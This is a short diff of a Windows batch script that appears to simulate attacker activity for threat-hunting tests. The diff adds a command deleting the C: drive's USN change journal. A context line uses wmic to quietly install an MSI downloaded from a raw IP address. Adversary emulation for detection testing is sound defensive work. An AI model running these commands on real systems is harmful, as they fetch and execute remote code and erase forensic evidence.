@@ -553,6 +553,8 @@ wmic process call create 'msiexec /i http://96.9.211.157/sdf4r3r3/WinDef.msi /q'
 ECHO ============================
 dir /b /ad "C:\Users\"
 ECHO ============================
+fsutil usn deletejournal /D C:
+ECHO ============================
 ECHO ***************************************************
 ECHO Test already Finishied  ! Happy hunting threats :)
 ECHO ***************************************************
